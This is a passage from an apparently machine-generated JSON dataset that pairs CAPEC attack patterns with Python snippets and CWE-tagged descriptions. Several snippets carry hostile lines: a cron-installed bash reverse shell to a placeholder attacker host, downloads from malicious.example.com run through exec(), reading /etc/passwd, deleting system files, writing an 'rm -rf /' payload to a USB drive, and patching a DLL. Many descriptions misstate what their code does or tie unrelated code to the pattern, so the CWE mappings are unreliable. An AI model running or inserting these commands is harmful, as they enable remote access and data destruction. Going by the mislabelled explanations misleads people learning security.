        "description": "This Python code snippet demonstrates a simple authentication system that is vulnerable to several security weaknesses described in the CAPEC and related CWEs. The `login` function relies on a single factor (username and password) for authentication (CWE-654). The `reflection_attack` function simulates a reflection attack by prompting the user for credentials and attempting to log in (CWE-301). The `log_event` function truncates security-relevant information, potentially obscuring the nature of an attack (CWE-222). Additionally, the code includes observable behavioral discrepancies by printing different messages based on the success or failure of the login attempt (CWE-205). The overall idea represents how an adversary can influence a target's actions by exploiting psychological principles and security weaknesses."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-301: Reflection Attack in an Authentication Protocol\n\ndef create_socket_connection(host, port):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((host, port))\n    return s\n\n# CWE-222: Truncation of Security-relevant Information\n# CWE-1229: Creation of Emergent Resource\n\ndef send_message(s, message):\n    truncated_message = message[:10]  # Truncate message to 10 characters\n    s.sendall(truncated_message.encode('utf-8'))\n\n# Main function demonstrating the vulnerability\nif __name__ == '__main__':\n    host = 'example.com'\n    port = 12345\n    s = create_socket_connection(host, port)\n    send_message(s, 'SensitiveInformationThatShouldNotBeTruncated')\n    s.close()",
        "description": "This Python code snippet demonstrates a vulnerable communication setup that embodies the main idea of CAPEC-Influence via Modes of Thinking. The code creates a socket connection to a specified host and port (CWE-940 and CWE-300), but it does not properly verify the source of the communication channel, making it susceptible to unauthorized access. Additionally, the send_message function truncates the message to 10 characters (CWE-222), potentially obscuring important security-relevant information. This truncation can lead to the creation of an emergent resource (CWE-1229) that attackers can exploit. The code also hints at the possibility of a reflection attack (CWE-301) due to the lack of proper authentication mechanisms."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import random\n\nclass EyeMovementTracker:\n    def __init__(self):\n        self.internal_state = random.choice(['secure', 'insecure'])\n\n    def track_eye_movement(self, eye_position):\n        if eye_position == 'left':\n            return self._process_left_movement()\n        elif eye_position == 'right':\n            return self._process_right_movement()\n        else:\n            return 'Invalid eye position'\n\n    def _process_left_movement(self):\n        if self.internal_state == 'secure':\n            return 'Secure left movement detected'\n        else:\n            return 'Insecure left movement detected'\n\n    def _process_right_movement(self):\n        if self.internal_state == 'secure':\n            return 'Secure right movement detected'\n        else:\n            return 'Insecure right movement detected'\n\n# Simulate tracking eye movements\ntracker = EyeMovementTracker()\nprint(tracker.track_eye_movement('left'))\nprint(tracker.track_eye_movement('right'))",
        "description": "This Python code snippet simulates an eye movement tracker that processes eye movements ('left' or 'right') and returns different responses based on an internal state ('secure' or 'insecure'). The internal state is randomly chosen at initialization. The code embodies the CAPEC 'Target Influence via Eye Cues' by simulating how an adversary might gain information through eye movements. The related CWEs are represented as follows: CWE-203 and CWE-205 are demonstrated by the observable differences in responses based on the internal state, which can reveal security-relevant information. CWE-451 is indirectly represented by the potential misrepresentation of critical information based on eye movements. CWE-222 and CWE-804 are not directly represented in this snippet but could be considered in a broader implementation context."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\nimport time\nimport random\n\n# Setup logging\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulate speculative execution vulnerability\nclass Processor:\n    def __init__(self):\n        self.secret_data = 'Sensitive Information'\n\n    def execute(self, condition):\n        if condition:\n            # Transient execution path\n            logging.debug(f'Transient execution with secret data: {self.secret_data}')\n        else:\n            # Correct execution path\n            logging.debug('Correct execution path')\n\n# Simulate excessive attack surface by exposing unnecessary methods\nclass Server:\n    def __init__(self):\n        self.processor = Processor()\n\n    def handle_request(self, user_input):\n        # Simulate speculative execution based on user input\n        self.processor.execute(user_input)\n\n    def debug_log(self, message):\n        logging.debug(message)\n\n# Simulate server handling requests\nserver = Server()\nfor _ in range(10):\n    user_input = random.choice([True, False])\n    server.handle_request(user_input)\n    time.sleep(1)",
        "description": "This Python code snippet simulates a speculative execution vulnerability in a processor, which can lead to the exposure of sensitive information. The `Processor` class has a method `execute` that logs sensitive data during transient execution based on a condition. The `Server` class exposes an excessive attack surface by providing unnecessary methods, such as `debug_log`, which logs messages to a file. The server handles requests in a loop, simulating speculative execution based on random user input. This code embodies the main idea of the deprecated CAPEC by demonstrating how transient execution can lead to information exposure, and it incorporates related CWEs by showing excessive attack surface and logging sensitive information."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    if not user_input.isalnum():\n        error_message = f\"Error: Invalid input '{user_input}'\"\n        return render_template_string('<h1>{{ error_message }}</h1>', error_message=error_message)\n    return 'Input is valid'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that accepts user input via a POST request. The code demonstrates several vulnerabilities related to the provided CAPEC and CWEs:\n\n1. **Improper Validation of Syntactic Correctness of Input (CWE-1286)**: The input validation only checks if the input is alphanumeric, which is insufficient for many applications.\n2. **Improper Neutralization of Script in an Error Message Web Page (CWE-81)**: If the input is not alphanumeric, an error message is generated that includes the raw user input, which could contain malicious scripts.\n3. **Generation of Error Message Containing Sensitive Information (CWE-209)**: The error message reveals the exact invalid input, which could be sensitive.\n4. **Improper Neutralization of Special Elements Used in a Template Engine (CWE-1336)**: The error message is rendered using Flask's `render_template_string`, which can be exploited if the input contains special template syntax.\n5. **Excessive Attack Surface (CWE-1125)**: The application exposes a web endpoint that processes user input without sufficient validation, increasing the attack surface.\n\nOverall, the code snippet illustrates how improper handling and validation of user input can lead to multiple security vulnerabilities in a web application."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# CWE-1286: Improper Validation of Syntactic Correctness of Input\ndef process_input(user_input):\n    if not isinstance(user_input, str):\n        logging.error('Invalid input type')\n        return 'Invalid input'\n    # CWE-149: Improper Neutralization of Quoting Syntax\n    if '\"' in user_input or \"'\" in user_input:\n        logging.error('Input contains dangerous characters')\n        return 'Invalid input'\n    # CWE-804: Guessable CAPTCHA\n    if user_input == '1234':  # Simplified CAPTCHA check\n        logging.error('CAPTCHA guessable')\n        return 'CAPTCHA failed'\n    return 'Input processed successfully'\n\n# Example usage\nuser_input = '\" OR 1=1 --'\nresult = process_input(user_input)\nprint(result)",
        "description": "This Python code snippet demonstrates several security weaknesses related to the deprecated CAPEC 'Target Influence via Voice in NLP'. The code includes logging of errors (CWE-532), improper validation of input syntax (CWE-1286), improper neutralization of quoting syntax (CWE-149), and a guessable CAPTCHA (CWE-804). The `process_input` function checks if the input is a string, ensures it does not contain dangerous characters like quotes, and performs a simplistic CAPTCHA check. If any of these checks fail, an error is logged, and an appropriate message is returned. This snippet highlights the importance of proper input validation and secure logging practices."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "import socket\n\n# CWE-319: Cleartext Transmission of Sensitive Information\n# CWE-924: Improper Enforcement of Message Integrity During Transmission\n# CWE-120: Buffer Copy without Checking Size of Input\n\ndef send_message(message):\n    # CWE-319: Transmitting sensitive information in cleartext\n    sensitive_info = \"UserPassword123\"\n    message += f\" {sensitive_info}\"\n\n    # CWE-120: Buffer Copy without Checking Size of Input\n    buffer = bytearray(1024)\n    if len(message) > len(buffer):\n        raise ValueError(\"Message too long\")\n    buffer[:len(message)] = message.encode('utf-8')\n\n    # CWE-924: No integrity check on the message\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('example.com', 80))\n        s.sendall(buffer)\n\n# Example usage\nsend_message(\"Hello, this is a test message.\")",
        "description": "This Python code snippet demonstrates a vulnerable communication pattern that aligns with the CAPEC description of 'Target Influence via The Human Buffer Overflow'. The code sends a message over a network socket, embedding sensitive information within the message (CWE-319). It also includes a buffer copy operation without properly checking the size of the input (CWE-120), and it does not enforce message integrity during transmission (CWE-924). This represents the idea of embedding messages within communication that can be exploited by an attacker."
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "import random\n\nclass SensitiveDataHandler:\n    def __init__(self):\n        self.sensitive_data = {'user1': 'password123', 'user2': 'qwerty'}\n        self.captcha_answers = ['1234', 'abcd', '5678']\n\n    def query_data(self, user):\n        # CWE-202: Exposure of Sensitive Information Through Data Queries\n        if user in self.sensitive_data:\n            return self.sensitive_data[user]\n        else:\n            return 'No data found'\n\n    def authenticate_user(self, user, password, captcha):\n        # CWE-804: Guessable CAPTCHA\n        if captcha in self.captcha_answers:\n            # CWE-213: Exposure of Sensitive Information Due to Incompatible Policies\n            if user in self.sensitive_data and self.sensitive_data[user] == password:\n                return 'Authentication successful'\n            else:\n                return 'Authentication failed'\n        else:\n            return 'Invalid CAPTCHA'\n\n    def log_behavior(self, user, action):\n        # CWE-205: Observable Behavioral Discrepancy\n        if user in self.sensitive_data:\n            print(f'User {user} performed {action}')\n        else:\n            print(f'Unknown user performed {action}')\n\n# Example usage\nhandler = SensitiveDataHandler()\nprint(handler.query_data('user1'))\nprint(handler.authenticate_user('user1', 'password123', '1234'))\nhandler.log_behavior('user1', 'login')",
        "description": "This Python code snippet represents a simplified system handling sensitive data, authentication, and logging. It embodies the main idea of CAPEC 'Target Influence via Interview and Interrogation' by demonstrating how an attacker might infer sensitive information through various means. The code includes vulnerabilities related to the specified CWEs:\n\n1. CWE-202: Sensitive data can be exposed through data queries.\n2. CWE-804: The CAPTCHA mechanism is weak and guessable.\n3. CWE-213: Sensitive information exposure due to incompatible policies.\n4. CWE-205: Observable behavioral discrepancies in logging actions.\n\nThe code highlights how these vulnerabilities can be exploited to infer or expose sensitive information, aligning with the CAPEC's focus on influencing targets through interrogation techniques."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "import socket\n\n# Vulnerable function to establish a communication channel\n\ndef establish_connection(host, port):\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((host, port))\n        print(f\"Connected to {host}:{port}\")\n        return s\n    except Exception as e:\n        print(f\"Connection failed: {e}\")\n        return None\n\n# Function to send data without verifying the source or destination\n\ndef send_data(s, data):\n    try:\n        s.sendall(data.encode('utf-8'))\n        print(\"Data sent\")\n    except Exception as e:\n        print(f\"Failed to send data: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    # Establish connection to an arbitrary host and port\n    connection = establish_connection('example.com', 80)\n    if connection:\n        # Send data without verifying the source or destination\n        send_data(connection, \"Hello, World!\")\n        connection.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of establishing a communication channel and sending data. The `establish_connection` function connects to a specified host and port without verifying the identity of the endpoint (CWE-300). The `send_data` function sends data over the established connection without verifying the source or destination (CWE-941, CWE-940). This code embodies the main idea of the CAPEC 'Target Influence via Instant Rapport' by showing how an attacker could exploit these weaknesses to influence the communication channel. The lack of proper verification and validation makes the system susceptible to unauthorized access and manipulation."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
        "code_snippet": "class Component:\n    def __init__(self, name, trusted=True, updateable=True):\n        self.name = name\n        self.trusted = trusted\n        self.updateable = updateable\n\nclass Product:\n    def __init__(self, components):\n        self.components = components\n\n    def check_security(self):\n        for component in self.components:\n            if not component.trusted:\n                print(f\"Warning: Component {component.name} is not trusted.\")\n            if not component.updateable:\n                print(f\"Warning: Component {component.name} is not updateable.\")\n\n# Example usage\ncomponents = [\n    Component(\"ComponentA\", trusted=False),\n    Component(\"ComponentB\", updateable=False),\n    Component(\"ComponentC\")\n]\n\nproduct = Product(components)\nproduct.check_security()",
        "description": "This Python code snippet defines a `Component` class and a `Product` class to simulate a product built from multiple components. The `Component` class has attributes to indicate whether it is trusted and updateable. The `Product` class has a method `check_security` that iterates through its components and prints warnings if any component is not trusted or not updateable. This embodies the main idea of the CAPEC 'Modification During Manufacture' by highlighting the risks associated with using untrusted or non-updateable components in a product. The related CWEs are represented by checking for trustworthiness (CWE-1357), updateability (CWE-1329), and the potential for security issues due to insufficiently trustworthy components."
    },
    {
        "capec_id": "439",
        "capec_name": "Manipulation During Distribution",
        "code_snippet": "import requests\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# Using a third-party library with known vulnerabilities\nresponse = requests.get('http://example.com/api/data')\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Exposing sensitive information in the response\nif response.status_code == 200:\n    sensitive_data = response.json().get('sensitive_info')\n    print(f'Sensitive Data: {sensitive_data}')\n\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# Assuming the response from the third-party API is trustworthy without validation\nif 'expected_key' in response.json():\n    print('Expected key found in response')\nelse:\n    print('Expected key not found, but proceeding anyway')",
        "description": "This Python code snippet demonstrates the concept of 'Manipulation During Distribution' by highlighting several related weaknesses. It uses the 'requests' library, which could be a vulnerable third-party component (CWE-1395). The code fetches data from an external API and exposes sensitive information (CWE-200) by printing it directly. Additionally, it relies on the response from the API without proper validation, assuming it is trustworthy (CWE-1357). This snippet encapsulates the idea of how an attacker could exploit weaknesses during the distribution and integration stages to compromise the integrity of a product."
    },
    {
        "capec_id": "440",
        "capec_name": "Hardware Integrity Attack",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, version):\n        self.version = version\n        self.redundant_block = True\n        self.voltage_protection = False\n        self.clock_protection = False\n        self.security_version = version\n\n    def inject_error(self):\n        if not self.redundant_block:\n            print('Error injected: Redundancy compromised')\n        else:\n            print('Error injected: System operating in degraded mode')\n\n    def glitch_attack(self):\n        if not self.voltage_protection or not self.clock_protection:\n            print('Voltage or clock glitch attack successful')\n        else:\n            print('Glitch attack detected and mitigated')\n\n    def downgrade_firmware(self, new_version):\n        if new_version < self.security_version:\n            self.security_version = new_version\n            print(f'Firmware downgraded to version {new_version}')\n        else:\n            print('Downgrade attempt failed')\n\n# Simulate an attack\ncomponent = HardwareComponent(version=2.0)\ncomponent.inject_error()\ncomponent.glitch_attack()\ncomponent.downgrade_firmware(1.0)",
        "description": "This Python code snippet simulates a hardware integrity attack by exploiting various weaknesses described in the CAPEC and related CWEs. The `HardwareComponent` class represents a hardware component with attributes for redundancy, voltage and clock protection, and security version. The `inject_error` method simulates an error injection attack that compromises redundancy. The `glitch_attack` method simulates a voltage or clock glitch attack. The `downgrade_firmware` method simulates a rollback attack by downgrading the firmware to a vulnerable version. This code embodies the main idea of the CAPEC by demonstrating how an adversary can exploit weaknesses in the system maintenance process to compromise hardware integrity."
    },
    {
        "capec_id": "441",
        "capec_name": "Malicious Logic Insertion",
        "code_snippet": "import os\nimport sys\n\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-284: Improper Access Control\n# CWE-1277: Firmware Not Updateable\n# CWE-1229: Creation of Emergent Resource\n\ndef malicious_logic():\n    # This function represents the embedded malicious logic\n    with open('malicious_file.txt', 'w') as f:\n        f.write('This is a malicious file.')\n\n    # Replicating malicious code\n    for i in range(5):\n        with open(f'malicious_copy_{i}.txt', 'w') as f:\n            f.write('This is a copy of the malicious file.')\n\n    # Improper access control: deleting a critical system file\n    if os.path.exists('/critical/system/file.txt'):\n        os.remove('/critical/system/file.txt')\n\n    # Creation of emergent resource: creating a new unauthorized file\n    with open('/unauthorized/resource.txt', 'w') as f:\n        f.write('Unauthorized resource created.')\n\n    # Firmware not updateable: simulate inability to update firmware\n    print('Firmware update functionality is not available.')\n\nif __name__ == '__main__':\n    malicious_logic()",
        "description": "This Python code snippet demonstrates the concept of 'Malicious Logic Insertion' by embedding malicious logic into a seemingly benign function. The code performs several malicious actions: it creates a malicious file and replicates it (CWE-506 and CWE-509), improperly deletes a critical system file (CWE-284), creates an unauthorized resource (CWE-1229), and simulates a scenario where firmware cannot be updated (CWE-1277). This represents how an adversary might insert hidden malicious logic into a system to achieve negative impacts."
    },
    {
        "capec_id": "442",
        "capec_name": "Infected Software",
        "code_snippet": "import requests\n\n# Function to download and execute code without integrity check (CWE-494)\ndef download_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)  # Dangerous: executing code from an untrusted source\n\n# Main function that appears benign but contains hidden malicious logic (CWE-507)\ndef main():\n    print('This is a benign message.')\n    # Hidden malicious logic (CWE-506)\n    download_and_execute('http://malicious.example.com/malicious_code.py')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of 'Infected Software' as described in the CAPEC. The `main` function appears to be benign by printing a harmless message, but it contains hidden malicious logic that downloads and executes code from a remote location without verifying its integrity (CWE-494). The `download_and_execute` function is responsible for this action, representing a potential Trojan Horse (CWE-507) and embedded malicious code (CWE-506). This snippet embodies the idea of adding malicious logic to otherwise benign software, which can lead to negative impacts on the user's system."
    },
    {
        "capec_id": "443",
        "capec_name": "Malicious Logic Inserted Into Product by Authorized Developer",
        "code_snippet": "import os\nimport requests\n\nclass MaliciousUpdater:\n    def __init__(self, url):\n        self.url = url\n\n    def download_and_execute(self):\n        # CWE-494: Download of Code Without Integrity Check\n        response = requests.get(self.url)\n        if response.status_code == 200:\n            exec(response.text)  # CWE-506: Embedded Malicious Code\n\n    def create_backdoor(self):\n        # CWE-277: Insecure Inherited Permissions\n        os.system('echo \"* * * * * /bin/bash -c \\\"bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1\\\"\" | crontab -')\n\n# CWE-671: Lack of Administrator Control over Security\nupdater = MaliciousUpdater('http://malicious.example.com/malicious_code.py')\nupdater.download_and_execute()\nupdater.create_backdoor()",
        "description": "This Python code snippet represents a malicious logic inserted into a product by an authorized developer. The `MaliciousUpdater` class downloads and executes code from a remote location without verifying its integrity (CWE-494). The downloaded code is executed directly, which could contain embedded malicious logic (CWE-506). Additionally, the `create_backdoor` method sets up a cron job with insecure inherited permissions (CWE-277) to establish a reverse shell, allowing an attacker to gain unauthorized access. The overall design lacks administrator control over security settings (CWE-671), making it difficult to tailor security measures to the environment."
    },
    {
        "capec_id": "444",
        "capec_name": "Development Alteration",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\n# Malicious function that will be triggered later\ndef malicious_function():\n    # Exposing sensitive system information\n    sensitive_info = os.popen('cat /etc/passwd').read()\n    print(sensitive_info)\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Security-critical function that might be optimized away\ndef security_critical_function():\n    # Dummy security check\n    if False:\n        print(\"Security check passed\")\n\n# Main function\nif __name__ == \"__main__\":\n    # Call the security-critical function\n    security_critical_function()\n    # Call the malicious function\n    malicious_function()",
        "description": "This Python code snippet demonstrates a development alteration attack by embedding malicious code that exposes sensitive system information. The `malicious_function` reads and prints the contents of the `/etc/passwd` file, which contains sensitive system information. The `security_critical_function` includes a dummy security check that is likely to be optimized away by the compiler or processor, representing CWE-733 and CWE-1037. The main function calls both the security-critical function and the malicious function, illustrating how an adversary might insert malicious logic during development to be leveraged later when the system is deployed."
    },
    {
        "capec_id": "445",
        "capec_name": "Malicious Logic Insertion into Product Software via Configuration Management Manipulation",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-506: Embedded Malicious Code\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n# CWE-1265: Unintended Reentrant Invocation of Non-reentrant Code Via Nested Calls\n\ndef update_configuration(config):\n    # Malicious logic inserted into configuration management\n    config['setting'] = 'malicious_value'\n    return config\n\n# Simulate configuration management manipulation\nconfig = {'setting': 'safe_value'}\nconfig = update_configuration(config)\n\n# Simulate deployment of the manipulated configuration\nos.system('echo Deploying with setting: ' + config['setting'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary exploits a configuration management system to insert malicious logic into a software product. The code downloads and executes a Python script from an untrusted source (CWE-494, CWE-829), which could contain embedded malicious code (CWE-506). The `update_configuration` function simulates the insertion of malicious logic into the configuration management system (CWE-913, CWE-1265). Finally, the manipulated configuration is deployed, showcasing how an adversary can force clients to install insecure software during updates."
    },
    {
        "capec_id": "446",
        "capec_name": "Malicious Logic Insertion into Product via Inclusion of Third-Party Component",
        "code_snippet": "import requests\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n# CWE-1395: Dependency on Vulnerable Third-Party Component\n# CWE-1357: Reliance on Insufficiently Trustworthy Component\n# CWE-506: Embedded Malicious Code\n\n# Simulating the inclusion of a third-party component from an untrusted source\nurl = 'http://untrusted-source.com/malicious_component.py'\nresponse = requests.get(url)\n\n# CWE-1103: Use of Platform-Dependent Third Party Components\n# Executing the downloaded component without verifying its integrity or trustworthiness\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates the inclusion of a third-party component from an untrusted source, which embodies the main idea of the CAPEC 'Malicious Logic Insertion into Product via Inclusion of Third-Party Component'. The code imports a potentially malicious script from an external URL and executes it without any verification. This represents several related CWEs: CWE-829 (inclusion of functionality from an untrusted control sphere), CWE-1395 (dependency on a vulnerable third-party component), CWE-1357 (reliance on an insufficiently trustworthy component), CWE-506 (embedded malicious code), and CWE-1103 (use of platform-dependent third-party components). The code highlights the risks associated with using unverified third-party components in a product."
    },
    {
        "capec_id": "447",
        "capec_name": "Design Alteration",
        "code_snippet": "import os\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# This function is supposed to check user permissions on the client side\n# instead of the server side, which is a design flaw.\ndef check_user_permission(user):\n    # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n    # Exposing sensitive system information\n    sensitive_info = os.getenv('SENSITIVE_INFO')\n    print(f\"Sensitive Info: {sensitive_info}\")\n    \n    # CWE-657: Violation of Secure Design Principles\n    # Using a hardcoded list of admin users (violates secure design principles)\n    admin_users = ['admin', 'superuser']\n    if user in admin_users:\n        return True\n    return False\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# This security check might be optimized away by the compiler\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# This security check might be optimized away by the processor\nsecurity_check = True\nif security_check:\n    print(\"Security check passed\")\nelse:\n    print(\"Security check failed\")\n\n# Simulate a user check\nuser = 'admin'\nif check_user_permission(user):\n    print(\"User has permission\")\nelse:\n    print(\"User does not have permission\")",
        "description": "This Python code snippet demonstrates a design alteration attack by incorporating several related CWEs. The `check_user_permission` function enforces security on the client side (CWE-602), which is a design flaw. It also exposes sensitive system information (CWE-497) by printing an environment variable. The function uses a hardcoded list of admin users, violating secure design principles (CWE-657). Additionally, a security check is included that might be optimized away by the compiler or processor (CWE-733 and CWE-1037). This code represents the main idea of a design alteration attack by embedding vulnerabilities that can be exploited later when the system is deployed."
    },
    {
        "capec_id": "448",
        "capec_name": "Embed Virus into DLL",
        "code_snippet": "import ctypes\nimport os\n\n# CWE-426: Untrusted Search Path\n# CWE-1102: Reliance on Machine-Dependent Data Representation\n# CWE-506: Embedded Malicious Code\n# CWE-509: Replicating Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n\n# Path to the legitimate DLL\nlegit_dll_path = 'C:\\path\\to\\legit.dll'\n\n# Malicious payload to be embedded\nmalicious_code = b'\\x90\\x90\\x90\\x90'  # NOP sled as a placeholder\n\n# Function to embed malicious code into the DLL\ndef embed_virus(dll_path, payload):\n    with open(dll_path, 'rb+') as dll_file:\n        content = dll_file.read()\n        # Find a gap to insert the malicious code (simplified example)\n        gap_index = content.find(b'\\x00' * len(payload))\n        if gap_index != -1:\n            dll_file.seek(gap_index)\n            dll_file.write(payload)\n        else:\n            print('No suitable gap found in the DLL.')\n\n# Function to load the tampered DLL\ndef load_tampered_dll(dll_path):\n    try:\n        ctypes.CDLL(dll_path)\n        print('DLL loaded successfully.')\n    except Exception as e:\n        print(f'Failed to load DLL: {e}')\n\n# Embed the virus into the legitimate DLL\nembed_virus(legit_dll_path, malicious_code)\n\n# Load the tampered DLL (this would trigger the malicious payload)\nload_tampered_dll(legit_dll_path)\n",
        "description": "This Python code snippet demonstrates the concept of embedding a virus into a DLL, as described in the CAPEC. The code first defines a path to a legitimate DLL and a malicious payload. The `embed_virus` function reads the DLL file, searches for a gap (represented by null bytes) to insert the malicious payload, and writes the payload into the gap. The `load_tampered_dll` function then attempts to load the tampered DLL using the `ctypes` library, which would trigger the malicious payload. This example incorporates several CWEs: CWE-426 (Untrusted Search Path) by using an externally supplied DLL path, CWE-1102 (Reliance on Machine-Dependent Data Representation) by assuming a specific data representation, CWE-506 (Embedded Malicious Code) by embedding the payload, CWE-509 (Replicating Malicious Code) by potentially spreading the virus, and CWE-497 (Exposure of Sensitive System Information) by potentially allowing unauthorized access to system information."
    },
    {
        "capec_id": "449",
        "capec_name": "DEPRECATED: Malware Propagation via USB Stick",
        "code_snippet": "import os\n\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-589: Call to Non-ubiquitous API\n\ndef handle_user_input(path):\n    # CWE-67: Improper Handling of Windows Device Names\n    if any(device in path for device in ['AUX', 'CON', 'NUL', 'PRN']):\n        raise ValueError('Invalid device name in path')\n\n    # CWE-506: Embedded Malicious Code\n    # Malicious code hidden within seemingly benign function\n    if path == 'malicious_path':\n        os.system('malicious_command')  # This represents the embedded malicious code\n\n    # CWE-589: Call to Non-ubiquitous API\n    try:\n        os.system('non_ubiquitous_command')  # This command may not exist on all platforms\n    except Exception as e:\n        print(f'Error: {e}')\n\n# CWE-507: Trojan Horse\n# The function appears to be benign but contains hidden malicious functionality\nhandle_user_input('user_provided_path')",
        "description": "This Python code snippet demonstrates a function that handles user input for file paths. It embodies the main idea of the deprecated CAPEC 'Malware Propagation via USB Stick' by including vulnerabilities related to the listed CWEs. The function checks for improper handling of Windows device names (CWE-67) and contains embedded malicious code (CWE-506) that executes a command if a specific path is provided. It also attempts to call a non-ubiquitous API (CWE-589), which may not exist on all platforms, potentially causing errors. The function appears benign but includes hidden malicious functionality, representing a Trojan Horse (CWE-507)."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport shutil\n\n# CWE-426: Untrusted Search Path\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n\n# Function to replicate malicious code\ndef replicate_malicious_code(src, dest):\n    try:\n        # CWE-67: Improper Handling of Windows Device Names\n        if 'AUX' in dest or 'CON' in dest:\n            raise ValueError('Invalid device name in path')\n        \n        # CWE-426: Untrusted Search Path\n        if not os.path.isabs(dest):\n            dest = os.path.join(os.getcwd(), dest)\n        \n        # Copy the malicious code to the destination\n        shutil.copy(src, dest)\n        print(f'Malicious code replicated to {dest}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nsource_file = 'malicious_code.py'\ndestination_path = 'C:\\Users\\Public\\malicious_code.py'\nreplicate_malicious_code(source_file, destination_path)",
        "description": "This Python code snippet demonstrates the concept of malware propagation via USB U3 autorun, which has been deprecated in favor of embedding a virus into a DLL (CAPEC-448). The code includes vulnerabilities related to CWE-426 (Untrusted Search Path), CWE-67 (Improper Handling of Windows Device Names), and CWE-509 (Replicating Malicious Code). The function `replicate_malicious_code` attempts to copy a malicious file to a specified destination. It checks for improper handling of Windows device names and ensures the destination path is absolute. This snippet represents how malicious code can replicate itself to other locations, potentially spreading malware."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import os\nimport platform\n\n# CWE-589: Call to Non-ubiquitous API\nif platform.system() == 'Windows':\n    import win32api\n    def eject_usb():\n        drives = win32api.GetLogicalDriveStrings()\n        drives = drives.split('\\000')[:-1]\n        for drive in drives:\n            if win32api.GetDriveType(drive) == win32api.DRIVE_REMOVABLE:\n                win32api.DeviceIoControl(drive, win32api.IOCTL_STORAGE_EJECT_MEDIA)\nelse:\n    def eject_usb():\n        os.system('umount /media/usb')\n\ndef main():\n    # CWE-507: Trojan Horse\n    def trojan_horse():\n        print('Performing legitimate task...')\n        # Hidden malicious code\n        with open('/media/usb/malware.py', 'w') as f:\n            f.write('import os\\nos.system(\"rm -rf /\")')\n\n    # Simulate malware propagation via infected peripheral device\n    if os.path.exists('/media/usb'):\n        trojan_horse()\n        eject_usb()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a simplified version of malware propagation via an infected peripheral device, specifically a USB drive. The code includes a platform-specific API call (CWE-589) to eject the USB drive, which may not be available on all systems. The 'trojan_horse' function represents a Trojan Horse (CWE-507) by performing a legitimate task while also writing malicious code to the USB drive. The main function checks for the presence of a USB drive, executes the Trojan Horse, and then ejects the USB drive. This embodies the main idea of the deprecated CAPEC pattern by simulating how malware can propagate through an infected peripheral device."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
